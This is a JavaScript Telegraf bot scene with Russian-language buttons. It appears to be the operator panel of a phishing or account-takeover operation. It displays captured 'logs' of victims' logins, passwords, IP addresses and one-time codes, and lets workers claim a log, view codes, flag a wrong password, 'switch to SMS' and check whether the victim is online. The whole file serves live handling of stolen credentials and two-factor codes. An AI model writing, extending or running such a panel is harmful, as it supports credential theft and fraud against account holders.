const { Scenes, Markup } = require('telegraf');
const logsService = require('../services/LogService');
const userService = require('../services/UserService');

const logScene = new Scenes.BaseScene('LOG_SCENE');

const buttonsPerPage = 5;

class FilterLog {
	constructor(ctx) {
		this.context = ctx;
	}

	filterId = () => {
		const log = this.context.session.logs.find((log) => log.id === this.context.match[1]);
		return log;
	};

	filterStatus = (status) => {
		const logs = this.context.session.logs.filter((log) => log.status === status);
		return logs;
	};
};

const generateKeyboard = (ctx) => {
	try {
		const currentData = new FilterLog(ctx).filterId();
		const codesArray = Object.entries(currentData.codes);
		const totalCodes = codesArray.length;
		const totalPages = Math.ceil(totalCodes / buttonsPerPage);
		const start = currentData.currentPage * buttonsPerPage;
		const end = Math.min(start + buttonsPerPage, totalCodes);
		const codesToDisplay = codesArray.slice(start, end);

		const backButton = Markup.button.callback('Назад', `BACK_MAIN_${ctx.match[1]}`);
		const keyboard = Markup.inlineKeyboard([
			codesToDisplay.map(([key, value]) =>
				Markup.button.callback(`${parseInt(key) + 1}`, `SHOW_ONE_CODE_${[(parseInt(key) + 1), value]}`)
			),
			[
				Markup.button.callback('◀️', `prev_${ctx.match[1]}`, currentData.currentPage > 0 ? false : true),
				Markup.button.callback('▶️', `next_${ctx.match[1]}`, currentData.currentPage < totalPages - 1 ? false : true),
			],
			[backButton],
		]);
		return keyboard.reply_markup;
	} catch (error) {
		console.log('Error generateKeyboard', error.message);
	}
};

const mainKeyboard = async (id, ctx) => {
	try {
		// const user = await userService.getUser(ctx.chat.id)
		const user = ctx.session.users.filter(user => user.id === ctx.chat.id)
		// const log = await new FilterLog(ctx).filterId();
		const { status } = await ctx.session.logs.filter(log => log.id === id)[0];
		const inlineKeyboard = Markup.inlineKeyboard([
			[Markup.button.callback('✅Взять лог', `TAKE_LOG_${id}`, status)],
			[Markup.button.callback('📝Посмотреть коды', `SHOW_CODES_${id}`, (!status || status === 2))],
			[
				Markup.button.callback('❌Неверный ЛП', `SHOW_ERROR_${id}`, (!status || status === 2)),
				Markup.button.callback('💬Перевести на смс', `SHOW_SMS_${id}`, (!status || status === 2)),
			],
			[Markup.button.callback('🌐Проверить онлайн', `CHECK_ONLINE_${id}`, (!status || status === 2))],
			[Markup.button.callback('🏁Завершить', `FINISH_${id}`, (!status || status === 2))],
			[Markup.button.callback('🗑️Удалить лог', `REMOVE_${id}`, ((status !== 2) || (user.status !== 2)))],
		]);
		return inlineKeyboard;
	} catch (error) {
		console.log('Error mainKeyboard', error.message);
	}
};

const backMain = async (ctx) => {
	const inlineKeyboard = await mainKeyboard(ctx.match[1], ctx);
	await ctx.editMessageReplyMarkup(inlineKeyboard.reply_markup);
}

const handleCodeSelection = async (ctx) => {
	try {
		const code = ctx.match[1];
		// await ctx.replyWithHTML(`Вы выбрали код ${code.split(',')[0]}: <code>${code.split(',')[1]}</code>`);
		await ctx.answerCbQuery(`Код № ${code.split(',')[0]}: ${code.split(',')[1]}`, {
			show_alert: true,
		});
	} catch (error) {
		console.log('Error handleCodeSelection', error.message);
	}
};

const handlePrevPage = async (ctx) => {
	try {
		const currentData = new FilterLog(ctx).filterId();
		if (currentData.currentPage > 0) {
			await logsService.prevPage(ctx.match[1], { currentPage: --currentData.currentPage });
		}
		await ctx.editMessageReplyMarkup(generateKeyboard(ctx));
	} catch (error) {
		console.log('Error handlePrevPage', error.message);
		await ctx.answerCbQuery('Это модальное окно!', {
			show_alert: true
		});
	}
};

const handleNextPage = async (ctx) => {
	try {
		const currentData = new FilterLog(ctx).filterId();
		const codesArray = Object.entries(currentData.codes);
		const totalCodes = codesArray.length;
		const totalPages = Math.ceil(totalCodes / buttonsPerPage);

		if (currentData.currentPage < totalPages - 1) {
			await logsService.nextPage(ctx.match[1], { currentPage: ++currentData.currentPage });
		}
		await ctx.editMessageReplyMarkup(generateKeyboard(ctx));
	} catch (error) {
		console.log('Error handleNextPage', error.message);
		await ctx.answerCbQuery('Это модальное окно!', {
			show_alert: true
		});
	}
};

const handleShowCodes = async (ctx) => {
	try {
		const log = new FilterLog(ctx).filterId();
		if (log?.codes?.length) {
			await ctx.editMessageReplyMarkup(generateKeyboard(ctx));
		} else {
			await ctx.answerCbQuery('Нет доступных кодов', { show_alert: true })
		}
	} catch (error) {
		console.log('Error handleShowCodes', error.message);
	}
};

const showAllLog = async (ctx) => {
	try {
		for (const log of ctx.session.logs) {
			const { id, status, login, password, ip } = log;
			await ctx.replyWithHTML(
				`ℹ️Status: ${status === 1 ? '🟢' : status === 2 ? '🏁' : '🔴'}\n👤Login: <code>${login}</code>\n🔑Password: <code>${password}</code>\n🖥️IP: ${ip} `,
				await mainKeyboard(id, ctx)
			);
		}
	} catch (error) {
		console.log('Error showAllLog', error.message);
	}
};

const showLog = async (ctx, active) => {
	try {
		const user = await userService.getUser(ctx.chat.id)
		// const logs = new FilterLog(ctx).filterStatus(active);
		// console.log((user?.logs && !(active === 0 || active === 2)))
		const logs = await (user?.logs && active === 1)
			? ctx.session.logs.filter(log => user?.logs.includes(log.id))
			: active !== 1 ? new FilterLog(ctx).filterStatus(active) : undefined

		if (logs?.length) {
			for (const log of logs) {
				const { id, status, login, password, ip } = log;
				await ctx.replyWithHTML(
					`ℹ️Status: ${status === 1 ? '🟢' : status === 2 ? '🏁' : '🔴'}\n👤Login: <code>${login}</code>\n🔑Password: <code>${password}</code>\n🖥️IP: ${ip} `,
					await mainKeyboard(id, ctx)
				);
			}
		} else {
			ctx.reply('Нет логов');

		}
	} catch (error) {
		console.log('Error showLog', error.message);
	}
};

const takeLog = async (ctx) => {
	try {
		const { id } = ctx.chat;
		const user = await ctx.session.users.filter(user => user.id === id)[0];
		let logs;
		const log = await new FilterLog(ctx).filterId();
		// const log = await logsService.getLog(ctx.match[1])
		if (log.status !== 1) {
			if (user?.logs && user?.logs.length && !user?.logs.includes(ctx.match[1])) {
				logs = [...user.logs, ctx.match[1]]
			}
			else {
				logs = [ctx.match[1]]
			}
			await userService.updateLogUser(id, { ...logs })
			await logsService.updateLog(ctx.match[1], { ...log, status: 1 })
			const inlineKeyboard = await mainKeyboard(ctx.match[1], ctx);
			const { status, login, password, ip } = await new FilterLog(ctx).filterId();
			await ctx.editMessageText(`ℹ️Status: ${status === 1 ? '🟢' : status === 2 ? '🏁' : '🔴'}\n👤Login: <code>${login}</code>\n🔑Password: <code>${password}</code>\n🖥️IP: ${ip}`, { parse_mode: 'HTML', reply_markup: inlineKeyboard.reply_markup });
		} else {
			const messageId = await ctx.update.callback_query.message.message_id;
			await ctx.answerCbQuery('Упс... Кто-то уже взял лог', { show_alert: true });
			await ctx.telegram.deleteMessage(ctx.chat.id, messageId)
		}
	} catch (error) {
		console.log('Error logScene takeLog()', error.message);
	}
}

logScene.enter(async (ctx) => {
	try {
		// console.log(ctx.session.timeoutId)
		const user = await userService.getUser(ctx.chat.id);
		let keyboard;
		if (user.status === 2) {
			keyboard = [
				['🔴Доступные логи', '🟢Активные логи'],
				['🏁Завершенные логи', '🔄Все логи'],
			]
		} else if (user.status === 1) {
			keyboard = [
				['🔴Доступные логи', '🟢Активные логи'],
				['🏁Завершенные логи'],
			]
		} else {
			keyboard = [
				['🔴Доступные логи'],
				['🟢Активные логи']
			]
		}
		await ctx.reply('Выберите действие:', {
			reply_markup: {
				keyboard,
				resize_keyboard: true,
			},
		});
	} catch (error) {
		console.log('Error logScene.enter()', error.message);

	}
	// return ctx.scene.leave();
})


logScene.hears('🔄Все логи', showAllLog);
logScene.hears('🔴Доступные логи', ctx => showLog(ctx, 0));
logScene.hears('🟢Активные логи', ctx => showLog(ctx, 1));
logScene.hears('🏁Завершенные логи', ctx => showLog(ctx, 2));

logScene.action(/^prev_(.*)$/, handlePrevPage);
logScene.action(/^next_(.*)$/, handleNextPage);
logScene.action(/^SHOW_ONE_CODE_(.*)$/, handleCodeSelection);
logScene.action(/^SHOW_CODES_(.*)$/, handleShowCodes);
logScene.action(/^BACK_MAIN_(.*)$/, backMain);
logScene.action(/^TAKE_LOG_(.*)$/, takeLog);

// logScene.leave((ctx) => {
// 	ctx.reply('Bye log')
// })

module.exports = logScene;